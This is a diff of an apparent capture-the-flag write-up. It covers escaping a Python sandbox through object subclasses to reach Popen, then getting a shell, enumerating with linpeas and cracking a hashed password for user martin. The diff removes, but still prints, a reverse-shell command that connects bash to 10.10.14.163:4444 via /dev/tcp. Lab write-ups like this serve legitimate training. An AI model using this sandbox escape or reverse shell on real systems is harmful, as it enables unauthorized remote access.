@@ -61,8 +61,7 @@ print((()).__class__.__bases__[0].__subclasses__())
 ```
 We got a long list of classes. We are searching for popen since that's a way to create a revshell. We know its there since we can just CTRL + F and search for it.
 ```bash
-raise Exception(str((()) .__class__.__bases__[0].__subclasses__()[317](
-    "bash -c 'bash -i >& /dev/tcp/10.10.14.163/4444 0>&1'", shell=True, stdout=-1).communicate()))
+
 ```
 We managed to get a reverse shell succesfully. I was able to get the user.txt from the ~/ and after that i decided to import linpeas over to enumerate the machine further.
 I found a database.db which has a password for the user martin. Its hashed so we have to use hashcat.
